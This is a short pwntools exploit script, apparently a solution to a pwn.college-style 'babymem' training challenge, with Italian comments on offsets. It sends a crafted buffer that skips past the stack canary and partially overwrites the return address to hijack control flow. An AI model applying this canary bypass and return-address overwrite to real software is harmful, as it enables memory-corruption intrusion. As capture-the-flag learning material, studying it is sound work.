from pwn import *

elf = ELF('/challenge/babymem-level-9-1')

io = elf.process()

# Il valore deve essere il valore del byte "più in là" riscritto
#   i.e., distanza dal return address + 2 per i due byte da riscrivere
io.sendline(b'106')

# Questo deve essere scritto dopo il buffer, e deve essere l'offset 
#   del byte dopo la canary, i.e., primo byte del return address

# Si aggiunge l'indirizzo della funzione, sempre un po' a cazzo
# hex(103) = 0x67
payload = b'\xff'*80 + b'\x67' + b'\xcb' + b'\x22'
io.sendline(payload)

io.interactive()
# 24 byte tra fine del buffer e inizio del return address
#   la notazione di ghidra NON include il return address?
